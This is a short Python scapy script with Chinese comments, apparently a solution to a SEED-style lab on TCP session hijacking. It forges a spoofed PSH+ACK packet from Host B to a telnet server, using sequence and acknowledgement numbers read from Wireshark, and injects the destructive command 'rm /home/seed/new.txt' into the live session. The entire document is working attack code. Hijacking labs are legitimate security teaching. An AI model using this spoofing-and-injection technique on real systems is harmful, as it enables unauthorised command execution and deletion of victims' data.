#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")  # 伪装成Host B
tcp = TCP(
    sport=35516,       # B的源端口
    dport=23,          # telnet端口
    flags="PA",        # PSH+ACK：携带数据并确认
    seq=1206056528,     # 从Wireshark获得的B的下一个序列号
    ack=3002475712            # 从Wireshark获得的确认号
)
data = "rm /home/seed/new.txt\n"  # 注入的恶意命令，\n表示回车
pkt = ip/tcp/data
send(pkt, verbose=0)